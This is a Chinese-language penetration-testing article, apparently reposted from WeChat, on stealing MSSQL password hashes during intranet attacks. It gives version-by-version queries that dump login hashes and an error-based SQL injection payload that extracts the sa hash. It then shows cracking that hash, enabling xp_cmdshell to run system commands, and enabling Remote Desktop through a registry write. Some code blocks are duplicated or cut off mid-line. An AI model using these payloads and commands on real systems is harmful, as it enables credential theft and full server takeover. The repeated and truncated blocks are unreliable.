> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nKV25G2PAI9rxXdtbyWE3A)

MSSQL 使用自制的密码哈希算法对用户密码进行哈希，在内网渗透中，大多数服务口令都是一样的，收集 MSSQL 数据库的用户和密码可能会有用。

**01**、**MSSQL 各版本密码 HASH**

**MSSQL 2000 版本**

```
select name,password from master.dbo.sysxlogins 

Hash格式: 
0x0100(固定) + 8位key＋40位HASH1 +40位HASH2
0x0100AC78A243F2E61FA800A7231C501D49CDA5B93A8A2294DC68AE487C99233F245F86A9ED5749F1838021EE1610
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4m46oY7u8ibDjFSIvvn0Or8Lj57iazN7gxCgXs5ZRMRPyxAdfCPBeR4NkgY8WPibNI0gicmUGm3M2hKGw/640?wx_fmt=png)

**MSSQL 2005 版本**  

```
select name,password_hash from sys.sql_logins

Hash格式：
0x0100(固定) ＋8位key＋ 20位HASH1 + 20位HASH2 
0x01004086CEB698DB9D0295DBF84F496FDDCECADE1AE5875EB294
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4m46oY7u8ibDjFSIvvn0Or8L3rr3tS8lKQmziaWBkX3IibaYFW0anTYD8sWkR0mH6vWlfXxSUUYJdicbg/640?wx_fmt=png)

**MSSQL 2008 R2 版本**

```
Select name,password_hash from sys.sql_logins where name = 'sa'

Hash格式：
0x0100(固定) ＋8位key＋ 20位HASH1 + 20位HASH2 
0x0100A9A79055CACB976F1BE9405D2F7BE7B2A98003007978F821
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4m46oY7u8ibDjFSIvvn0Or8LqufI0luGBg0RmnxxqgzBKlhlxiaJMzc7YCCA0iaGZ6VxiaicmNia1bWWIeg/640?wx_fmt=png)

**MSSQL 2012 R2 版本**

```
select name,password_hash from sys.sql_logins

0x02009B23262ECB00E289977FA1209081C623020F2D28E23B5C615AC7BA8C0F25FEE638DC2E4DEAF023350C1E31199364879A94D65FC79F10BB577D6CB86A8C7148928DC8AFFB
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4m46oY7u8ibDjFSIvvn0Or8LHvSqpHXgUwibBkZibdl1JNHLqGnm6ARb5lVkWLNKc10asblkOfO0iaeGQ/640?wx_fmt=png)

**SQL Server 2016 版本**

```
select name,password_hash from sys.sql_logins 

0x02002F8E6FBBE1B6A9961A7E397FDD3A26F795DF806A066940B26323BE89F3450064C8657C75E2A3729E8318BBE91692335F4D2F5633BADEF7A25EC8AC003E9C4DB342312505
```

```
?Keyword=1111%' AND (Select  master.dbo.fn_varbintohexstr(password) from master.dbo.sysxlogins where name='sa')=1 AND '%'='
```

**02、SQL 注入获取 Sa 账号密码**

(1) 通过报错注入获取 sa 账户的哈希密码

```
# 开启xp_cmdshell存储过程
EXEC master..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell', 1;RECONFIGURE;
# 利用xp_cmdshell执行系统命令
Exec master.dbo.xp_cmdshell '
# SQL语句开启远程
Exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
```

```
?Keyword=1111%' AND (Select  master.dbo.fn_varbintohexstr(password) from master.dbo.sysxlogins where name='sa')=1 AND '%'='
```

（2）解密获取 sa 明文密码

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4m46oY7u8ibDjFSIvvn0Or8LpKnEp3Sgt9ZgMH4UrPHHfic3ibVzxBT3fwVasVBGtvna8KMlCHHbic4Ow/640?wx_fmt=png)

（3）在内网或数据库端口开放的情况下，可直接连入数据库执行系统命令，获取服务器控制权限。  

```
# 开启xp_cmdshell存储过程
EXEC master..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell', 1;RECONFIGURE;
# 利用xp_cmdshell执行系统命令
Exec master.dbo.xp_cmdshell '
# SQL语句开启远程
Exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
```